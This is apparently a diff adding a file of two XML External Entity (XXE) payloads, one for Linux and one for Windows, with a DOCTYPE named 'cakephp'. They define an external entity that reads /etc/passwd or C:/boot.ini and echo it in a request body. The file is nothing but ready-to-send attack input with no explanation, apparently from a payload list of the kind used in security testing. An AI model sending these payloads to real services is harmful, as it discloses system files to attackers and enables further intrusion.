@@ -1,0 +1,14 @@
+Linux:
+<!DOCTYPE cakephp [
+  <!ENTITY payload SYSTEM "file:///etc/passwd" >]>
+<request>
+  <xxe>&payload;</xxe>
+</request>
+ 
+Windows:
+<!DOCTYPE cakephp [
+  <!ENTITY payload SYSTEM "file:///C:/boot.ini" >]>
+<request>
+  <xxe>&payload;</xxe>
+</request>
+
